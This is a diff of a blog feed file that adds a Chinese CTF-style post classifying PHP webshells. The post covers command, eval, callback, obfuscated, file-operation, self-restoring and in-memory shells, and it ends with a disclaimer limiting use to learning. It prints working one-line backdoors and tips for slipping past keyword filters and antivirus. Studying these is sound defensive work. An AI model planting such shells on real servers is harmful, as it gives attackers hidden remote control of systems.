@@ -8,9 +8,25 @@
     <link href="/Crow.github.io/2026/11/18/%E6%A2%B3%E7%90%86%E7%8E%B0%E9%98%B6%E6%AE%B5%E5%B8%B8%E8%A7%81%E7%9A%84Webshell/"/>
     <url>/Crow.github.io/2026/11/18/%E6%A2%B3%E7%90%86%E7%8E%B0%E9%98%B6%E6%AE%B5%E5%B8%B8%E8%A7%81%E7%9A%84Webshell/</url>
     
-    <content type="html"><![CDATA[<p>工具:</p><p>环境:</p><p>内容:</p><p>原理:</p>]]></content>
+    <content type="html"><![CDATA[<p>工具:ai</p><p>环境:主机</p><p>内容:梳理现阶段常见的Webshell,还有一些我感觉很有趣的Webshell</p><h2 id="1-cmd型"><a href="#1-cmd型" class="headerlink" title="1,cmd型"></a>1,cmd型</h2><p>传命令,属于命令执行型</p><p>典型马:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li><strong>a,值里面放的是系统命令:</strong> <code>cmd=ls /</code>,<code>cmd=cat /flag</code></li><li><strong>b,PHP会将这个字符串直接丢给shell执行</strong></li><li><strong>c,一次只能跑一个命令,回显就是命令的输出</strong></li></ul><h2 id="2-eval型"><a href="#2-eval型" class="headerlink" title="2,eval型"></a>2,eval型</h2><p>传PHP语句,属于代码执行型</p><p>典型马:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;value&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><ul><li><strong>a,值里面放的是PHP代码,还得分号结尾:</strong> <code>value=system(&#39;ls /&#39;);</code></li><li><strong>b,想跑命令得自己套一层system() &#x2F; passthru()</strong></li><li><strong>c,能力更大,不仅可以跑命令,还能读写文件,连数据库,跑任意PHP,想跑几条跑几条</strong></li><li><strong>d,蚁剑和菜刀生成的马基本都是eval型</strong></li></ul><h2 id="如何判断这两种马"><a href="#如何判断这两种马" class="headerlink" title="如何判断这两种马"></a>如何判断这两种马</h2><ul><li><strong>a,传phpinfo();正常吐出PHP信息的是eval&#x2F;代码型</strong></li><li><strong>b,传ls &#x2F;正常列出目录–&gt;cmd型;报unexpected之类的就是eval将ls当做函数名了,是eval型</strong></li></ul><h2 id="3-回调-可变函数型-常用于绕过关键词过滤"><a href="#3-回调-可变函数型-常用于绕过关键词过滤" class="headerlink" title="3,回调&#x2F;可变函数型(常用于绕过关键词过滤)"></a>3,回调&#x2F;可变函数型(常用于绕过关键词过滤)</h2><p>典型马:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$f</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;f&#x27;</span>]; <span class="hljs-variable">$f</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]); <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>可以发现这个木马的代码本身里面并不出现system这个词(system这个词通过后续传参进入木马),可以逃过纯关键词检测</p><h2 id="4-混淆型"><a href="#4-混淆型" class="headerlink" title="4,混淆型"></a>4,混淆型</h2><p>用来躲查杀和防火墙</p><p>外面套上base64_decode,gzinflate,str_rot13或者异或,解出来才是真正的马</p><h2 id="5-文件操作型"><a href="#5-文件操作型" class="headerlink" title="5,文件操作型"></a>5,文件操作型</h2><p>不跑命令,只读写文件,专治system被disable_function的题</p><p><code>file_get_contents</code> &#x2F; <code>file_put_contents</code> &#x2F; <code>fopen + fread</code> &#x2F; <code>scandir</code></p><p>不执行命令,但是可以直接读取文件,列目录,传新马</p><h2 id="不死马-内存马"><a href="#不死马-内存马" class="headerlink" title="不死马&#x2F;内存马"></a>不死马&#x2F;内存马</h2><p><strong>不死马:</strong> <code>ignore_user_abort(true)</code> + 死循环,删了文件可以自己再写回来</p><p><strong>内存马:</strong> 不落文件,靠<code>.user.ini</code> 的 <code>auto_prepend_file</code>、session 文件包含、PHP-FPM 之类实现，重启服务才会消失</p><p>按照形态来分类:有一句话木马(最短),大马(带管理面板),图片马(GIF89a头伪装),流量加密马(要配套客户端,抓包看不见明文,比如冰蝎&#x2F;哥斯拉)</p><hr><p>⚠️ 声明：本文涉及的攻击技术仅供网络安全学习与授权测试（如CTF靶场）使用。严禁用于任何未授权的真实网络环境，否则将触犯法律！</p>]]></content>
     
     
+    <categories>
+      
+      <category>Web安全</category>
+      
+    </categories>
+    
+    
+    <tags>
+      
+      <tag>CTF</tag>
+      
+      <tag>Web</tag>
+      
+      <tag>WebShell</tag>
+      
+    </tags>
     
   </entry>
   
@@ -33,11 +49,11 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>XSS</tag>
       
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
     </tags>
     
@@ -64,9 +80,9 @@
       
       <tag>CTF</tag>
       
-      <tag>文件上传</tag>
-      
       <tag>Burp Suite</tag>
+      
+      <tag>文件上传</tag>
       
     </tags>
     
@@ -93,9 +109,9 @@
       
       <tag>CTF</tag>
       
-      <tag>文件上传</tag>
-      
       <tag>Burp Suite</tag>
+      
+      <tag>文件上传</tag>
       
     </tags>
     
@@ -122,9 +138,9 @@
       
       <tag>Web</tag>
       
-      <tag>Apache</tag>
-      
       <tag>小专栏</tag>
+      
+      <tag>Apache</tag>
       
     </tags>
     
@@ -178,13 +194,13 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
-      <tag>小专栏</tag>
-      
       <tag>CTF</tag>
       
+      <tag>Web</tag>
+      
       <tag>信息读取</tag>
+      
+      <tag>小专栏</tag>
       
     </tags>
     
@@ -211,9 +227,9 @@
       
       <tag>CTF</tag>
       
-      <tag>文件上传</tag>
-      
       <tag>Burp Suite</tag>
+      
+      <tag>文件上传</tag>
       
     </tags>
     
@@ -298,9 +314,9 @@
     
     <tags>
       
-      <tag>Web</tag>
-      
       <tag>CTF</tag>
+      
+      <tag>Web</tag>
       
       <tag>文件上传</tag>
       
@@ -360,11 +376,11 @@
     
     <tags>
       
+      <tag>Burp Suite</tag>
+      
       <tag>文件上传</tag>
       
       <tag>Pikachu</tag>
-      
-      <tag>Burp Suite</tag>
       
       <tag>MIME</tag>
       
@@ -391,13 +407,13 @@
     
     <tags>
       
+      <tag>Burp Suite</tag>
+      
       <tag>文件上传</tag>
       
       <tag>Curl</tag>
       
       <tag>Pikachu</tag>
-      
-      <tag>Burp Suite</tag>
       
     </tags>
     
